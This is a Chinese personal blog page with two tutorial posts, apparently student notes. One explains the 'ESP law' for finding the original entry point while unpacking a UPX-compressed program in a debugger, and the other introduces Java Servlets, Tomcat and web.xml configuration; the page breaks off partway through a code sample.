<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Hexo</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Hexo"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Hexo"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="Hexo"><meta property="og:url" content="http://example.com/"><meta property="og:site_name" content="Hexo"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/img/og_image.png"><meta property="article:author" content="John Doe"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com"},"headline":"Hexo","image":["http://example.com/img/og_image.png"],"author":{"@type":"Person","name":"John Doe"},"description":""}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item is-active" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-05-28T04:36:53.000Z" title="2021-05-28T04:36:53.000Z">2021-05-28</time>发表</span><span class="level-item"><time dateTime="2021-05-28T04:57:42.373Z" title="2021-05-28T04:57:42.373Z">2021-05-28</time>更新</span><span class="level-item">10 分钟读完 (大约1451个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/05/28/ESP%E5%AE%9A%E5%BE%8B%E5%92%8C%E5%8A%A8%E6%80%81%E8%84%B1UPX%E5%A3%B3/">ESP定律和动态脱UPX壳</a></h1><div class="content"><h1 id="关于ESP定律"><a href="#关于ESP定律" class="headerlink" title="关于ESP定律"></a>关于ESP定律</h1><p>简单来说，给栈顶ESP下硬件断点，ESP被拿走的时候就会停住，而在ESP上面push值或者pop值都不会停住</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">S:Stack栈</span><br><span class="line">P:Pointer指针</span><br></pre></td></tr></table></figure>



<p>注意栈底部大上面小，SP是栈顶指针，一有羽毛球进去就会减少4个大小</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2FnutA"><img src="https://z3.ax1x.com/2021/05/28/2FnutA.png" alt="2FnutA.png"></a></p>
<p>先放了一个球进栈，ESP值由开始的<code>0012FFC4</code>减去4变成了<code>0012FFC0</code></p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2Fnnkd"><img src="https://z3.ax1x.com/2021/05/28/2Fnnkd.png" alt="2Fnnkd.png"></a></p>
<p>再放一个ESP又减去4</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2FneTH"><img src="https://z3.ax1x.com/2021/05/28/2FneTH.png" alt="2FneTH.png"></a></p>
<p>所有的步骤执行完，ESP变成了<code>0012FFA4</code></p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2FnVmD"><img src="https://z3.ax1x.com/2021/05/28/2FnVmD.png" alt="2FnVmD.png"></a></p>
<p>现在正式开始ESP定律</p>
<p>在<code>0012FFA4</code>下一个硬件访问断点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">端点：就是运行到这个地方暂停</span><br><span class="line">访问断电：再次访问0012FFA4这个地址就停下来</span><br><span class="line">硬件访问端点：可以设置在任何位置上（普通软件断点可以用于内存，堆栈上。要记住）</span><br></pre></td></tr></table></figure>



<p>下列语句执行完后</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2FnKfI"><img src="https://z3.ax1x.com/2021/05/28/2FnKfI.png" alt="2FnKfI.png"></a></p>
<p>上面语句执行完后，结果如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问断点：0012FFA4 EDI这个羽毛球不在桶里的时候，一改变就停止</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2FnZ0e"><img src="https://z3.ax1x.com/2021/05/28/2FnZ0e.png" alt="2FnZ0e.png"></a></p>
<p>现在给<code>0012FFAC</code>处下了硬件访问断点，研究一下怎么才会停下</p>
<p>这两种都不会停下</p>
<p>在栈顶<code>0012FFAC</code>上面加了两个新的羽毛球</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2FnY7Q"><img src="https://z3.ax1x.com/2021/05/28/2FnY7Q.png" alt="2FnY7Q.png"></a></p>
<p>又把刚才加的两个拿走了，也没有影响</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2Fn3X8"><img src="https://z3.ax1x.com/2021/05/28/2Fn3X8.png" alt="2Fn3X8.png"></a></p>
<p>这个才会停下，一定要把<code>0012FFAC</code>位置上的给拿走了（pop），才会停住</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2FnUts"><img src="https://z3.ax1x.com/2021/05/28/2FnUts.png" alt="2FnUts.png"></a></p>
<h2 id="堆栈平衡"><a href="#堆栈平衡" class="headerlink" title="堆栈平衡"></a>堆栈平衡</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">简单来说：</span><br><span class="line">程序1（解压代码）执行过程中往栈里先push再pop-&gt;执行结束后栈为空，真正代码开始执行，找到OEP</span><br></pre></td></tr></table></figure>

<p>upx加壳后的程序运行时会先加载upx加入的代码（我们叫它程序1），把压缩后的代码还原出来。程序1是一个完整的程序，作用是解码后面的代码</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2FnQpt"><img src="https://z3.ax1x.com/2021/05/28/2FnQpt.png" alt="2FnQpt.png"></a></p>
<p>完整的程序什么时候结束？</p>
<p>当栈第一次回到初始状态的时候</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2Fn16f"><img src="https://z3.ax1x.com/2021/05/28/2Fn16f.png" alt="2Fn16f.png"></a></p>
<p>没开始执行时栈是空的，程序开始执行后程序1入栈（想象push了很多值进栈）</p>
<p>现在栈还是空的，</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2FnGnS"><img src="https://z3.ax1x.com/2021/05/28/2FnGnS.png" alt="2FnGnS.png"></a></p>
<p>程序1先入栈（push一些值进栈）</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2FnJ0g"><img src="https://z3.ax1x.com/2021/05/28/2FnJ0g.png" alt="2FnJ0g.png"></a></p>
<p>程序1.1入栈（又push了一些值进栈）</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2FnNkj"><img src="https://z3.ax1x.com/2021/05/28/2FnNkj.png" alt="2FnNkj.png"></a></p>
<p>接着程序1.1和程序1陆续出栈，栈空了，解压代码执行结束。</p>
<p>程序1也就是解压代码执行完后，栈返回初始空状态，这里就是程序真正开始的地方，也就是我们要找的<code>OEP</code></p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2Fnahn"><img src="https://z3.ax1x.com/2021/05/28/2Fnahn.png" alt="2Fnahn.png"></a></p>
<h2 id="ESP定律的变形用法"><a href="#ESP定律的变形用法" class="headerlink" title="ESP定律的变形用法"></a>ESP定律的变形用法</h2><p>初始状态的ESP地址为<code>0012FFC4</code>，在它的上一个地址<code>0012FFC0</code>下一个硬件访问断点</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2Fnwpq"><img src="https://z3.ax1x.com/2021/05/28/2Fnwpq.png" alt="2Fnwpq.png"></a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">初始ESP指向0012FFC4，upx加壳程序运行时先执行解压代码，解压代码会在栈里先pushad再popad，在解压代码执行完后栈空了，只要事先在0012FFC4的上面0012FFC0下一个硬件访问断点，这样popad拿到初始ESP的时候就停住了，</span><br></pre></td></tr></table></figure>



<h1 id="动态脱upx壳"><a href="#动态脱upx壳" class="headerlink" title="动态脱upx壳"></a>动态脱upx壳</h1><p>起点</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2Fn010"><img src="https://z3.ax1x.com/2021/05/28/2Fn010.png" alt="2Fn010.png"></a></p>
<p>接下来按f8单步执行pushad指令，再设置硬件读取断点</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2FnsnU"><img src="https://z3.ax1x.com/2021/05/28/2FnsnU.png" alt="2FnsnU.png"></a></p>
<p>设置完按f9运行程序，再次中断在一个不同的地址。这里并不是真实的程序代码，而是一个将栈空间向上清零0x80长度的循环。后面跟着一个向前的远距离的跳转（0043208C跳到00404DDC），这个就是跳到源代码的跳转（壳程序一般与程序原来的代码在不同的区段，故相隔较远）。</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2Fnh1x"><img src="https://z3.ax1x.com/2021/05/28/2Fnh1x.png" alt="2Fnh1x.png"></a></p>
<p>接下来删除硬件断点，菜单栏选择<code>调试-&gt;硬件断点</code></p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2FnBcV"><img src="https://z3.ax1x.com/2021/05/28/2FnBcV.png" alt="2FnBcV.png"></a></p>
<p>把光标移动到这个jmp，按f4使得程序执行到光标处，再按f8执行跳转</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2FnDXT"><img src="https://z3.ax1x.com/2021/05/28/2FnDXT.png" alt="2FnDXT.png"></a></p>
<p>跳转后出现了正常的函数开头和结尾，判断这个代码片段属于原程序</p>
<p>开头</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2Fn674"><img src="https://z3.ax1x.com/2021/05/28/2Fn674.png" alt="2Fn674.png"></a></p>
<p>结尾</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2FnyBF"><img src="https://z3.ax1x.com/2021/05/28/2FnyBF.png" alt="2FnyBF.png"></a></p>
<p>对程序进行Dump，在插件中选择脱壳程序</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2FngAJ"><img src="https://z3.ax1x.com/2021/05/28/2FngAJ.png" alt="2FngAJ.png"></a></p>
<p>单击获取EIP作为OEP，再单击脱壳</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2Fn2N9"><img src="https://z3.ax1x.com/2021/05/28/2Fn2N9.png" alt="2Fn2N9.png"></a></p>
<p>保存脱壳后的文件，然后用ida打开，可以看到被完全还原</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2Fnf91"><img src="https://z3.ax1x.com/2021/05/28/2Fnf91.png" alt="2Fnf91.png"></a></p>
<p>运行正常</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/2FnRhR"><img src="https://z3.ax1x.com/2021/05/28/2FnRhR.png" alt="2FnRhR.png"></a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-05-23T06:38:50.000Z" title="2021-05-23T06:38:50.000Z">2021-05-23</time>发表</span><span class="level-item"><time dateTime="2021-05-23T06:42:45.517Z" title="2021-05-23T06:42:45.517Z">2021-05-23</time>更新</span><span class="level-item">14 分钟读完 (大约2125个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/05/23/Servlet%E5%AD%A6%E4%B9%A0/">Servlet学习</a></h1><div class="content"><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>Servlet</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java  Servlet（Java服务器小程序）是一个基于Java技术的Web组件，运行在服务器端，它由Servlet容器所管理，用于生成动态的内容。  Servlet是平台独立的Java类，编写一个Servlet，实际上就是按照Servlet规范编写一个Java类。Servlet被编译为平台独立 的字节码，可以被动态地加载到支持Java技术的Web服务器中运行。</span><br></pre></td></tr></table></figure>

<p>Servlet容器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Servlet容器也叫做Servlet引擎，是Web服务器或应用程序服务器的一部分，用于在发送的请求和响应之上提供网络服务，解码基于  MIME的请求，格式化基于MIME的响应。Servlet没有main方法，不能独立运行，它必须被部署到Servlet容器中，由容器来实例化和调用  Servlet的方法（如doGet()和doPost()），Servlet容器在Servlet的生命周期内包容和管理Servlet。在JSP技术 推出后，管理和运行Servlet&#x2F;JSP的容器也称为Web容器。</span><br></pre></td></tr></table></figure>



<p> Tomcat</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Tomcat是一个免费的开放源代码的Servlet容器。</span><br><span class="line">Tomcat服务器接受客户请求并做出响应的过程如下，与上图类似：</span><br><span class="line">1）客户端（通常都是浏览器）访问Web服务器，发送HTTP请求。 </span><br><span class="line">2）Web服务器接收到请求后，传递给Servlet容器。 </span><br><span class="line">3）Servlet容器加载Servlet，产生Servlet实例后，向其传递表示请求和响应的对象。 </span><br><span class="line">4）Servlet实例使用请求对象得到客户端的请求信息，然后进行相应的处理。 </span><br><span class="line">5）Servlet实例将处理结果通过响应对象发送回客户端，容器负责确保响应正确送出，同时将控制返回给Web服务器。</span><br></pre></td></tr></table></figure>



<h1 id="tomcat目录结构"><a href="#tomcat目录结构" class="headerlink" title="tomcat目录结构"></a>tomcat目录结构</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bin，用于存放Tomcat的各种配置文件，比如，web.xml、server.xml</span><br><span class="line">lib，用于存放Tomcat服务器，和所有Web应用程序需要访问的JAR文件</span><br><span class="line">logs，用于存放Tomcat的日志文件</span><br><span class="line">temp，用于存放Tomcat运行时，产生的临时文件</span><br><span class="line">webapps，Web应用程序的主要发布目录，通常将要发布的应用程序放到这个目录下</span><br><span class="line">work，Tomcat的工作目录，JSP编译生成的Servlet源文件，和字节码文件放在这个目录下</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/60a9f8e30b43a.jpg"></p>
<h1 id="idea-tomcat部署过程"><a href="#idea-tomcat部署过程" class="headerlink" title="idea tomcat部署过程"></a>idea tomcat部署过程</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_28513801/article/details/92838236">https://blog.csdn.net/qq_28513801/article/details/92838236</a></p>
<h1 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h1><h2 id="什么是servlet"><a href="#什么是servlet" class="headerlink" title="什么是servlet?"></a>什么是servlet?</h2><p>本质上就是一个运行在web容器(web服务器中)的java类，tomcat是web容器中的一个。</p>
<p>作用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用于处理用户的请求并作出响应</span><br></pre></td></tr></table></figure>

<p>servlet与普通的java程序的区别：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.本质上就是一个java类</span><br><span class="line">2.所有的servlet必须实现接口：Servlet</span><br><span class="line">3.运行Tomcat中，web容器中</span><br><span class="line">4.对用户的请求进行处理，并且做出响应</span><br></pre></td></tr></table></figure>



<p>编写步骤：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.创建一个继承于HttpServlet的类（HttpServlet实现了Servlet接口）</span><br><span class="line">2.重写doGet或doPost方法，分别用来处理浏览器提交的get或post请求</span><br><span class="line">3.配置webapp&#x2F;WEB-INF&#x2F;web.xml 文件，配置Servlet 的访问地址。</span><br></pre></td></tr></table></figure>



<h2 id="配置Servlet"><a href="#配置Servlet" class="headerlink" title="配置Servlet"></a>配置Servlet</h2><p>写好的Serlvet保存在src目录中</p>
<p><img src="https://www.hualigs.cn/image/60a9f8e6559d1.jpg"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myServlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line">        PrintWriter writer=resp.getWriter();</span><br><span class="line">        writer.println(<span class="string">&quot;&lt;h1 style=&#x27;color:red&#x27;&gt;11111&lt;/h1&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在WEB-INF/web.xml中配置servlet-mapping和servlet-name</p>
<p><img src="https://www.hualigs.cn/image/60a9f8e47016d.jpg"></p>
<p>访问效果</p>
<p><img src="https://www.hualigs.cn/image/60a9f8e47bc5b.jpg"></p>
<h2 id="servlet生命周期"><a href="#servlet生命周期" class="headerlink" title="servlet生命周期"></a>servlet生命周期</h2><p>一个servlet只会在tomcat容器中实例化一次，且只会产生一个对象，常驻内存，要等到服务器关闭才会销毁。tomcat对它做了多线程处理，这样才能实现一个对象多个请求</p>
<p>init：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">初始化方法，用户第1次访问的时候会执行1次</span><br></pre></td></tr></table></figure>

<p>service ：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">处理服务请求的方法，每次请求都会执行</span><br></pre></td></tr></table></figure>

<p>destory：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">销毁方法，服务器关闭的时候执行1次</span><br></pre></td></tr></table></figure>



<p>继承Servlet类并重写三个方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myServlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServletDemo</span> <span class="keyword">implements</span> <span class="title">Servlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ServletConfig <span class="title">getServletConfig</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span>  ServletException, IOException</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getServletInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;destroy&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>访问页面后，可以看到执行了service方法</p>
<p><img src="https://www.hualigs.cn/image/60a9f8e4f3c1e.jpg"></p>
<h1 id="ServletConfig接口"><a href="#ServletConfig接口" class="headerlink" title="ServletConfig接口"></a>ServletConfig接口</h1><p>在Servlet的配置文件web.xml中，可以使用一个或多个<code>&lt;init-param&gt;</code>标签为servlet配置一些初始化参数。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>mytest<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.myServlet.ConfigServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>name<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>password<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>mytest<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/mytest<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>getInitParameter(“参数”) 通过参数名，得到文件中参数值</p>
<p>getInitParameterNames() 得到所有参数名字</p>
<p>tomcat在创建Servlet实例时会自动把上面的初始化参数封装对ServletConfig对象中，并在调用init方法时，把ServletConfig对象传递给servlet。通过ServletConfig对象就可以得到当前servlet的初始化参数信息。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myServlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.Enumeration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConfigServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException</span>&#123;</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line">        PrintWriter writer=resp.getWriter();</span><br><span class="line">        String name=getInitParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        writer.println(name);</span><br><span class="line"></span><br><span class="line">        Enumeration initParameterNames=getInitParameterNames();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (initParameterNames.hasMoreElements())&#123;</span><br><span class="line"></span><br><span class="line">            String element= (String) initParameterNames.nextElement();</span><br><span class="line">            String value=getInitParameter(element);</span><br><span class="line">            writer.println(<span class="string">&quot;参数名:&quot;</span>+element+<span 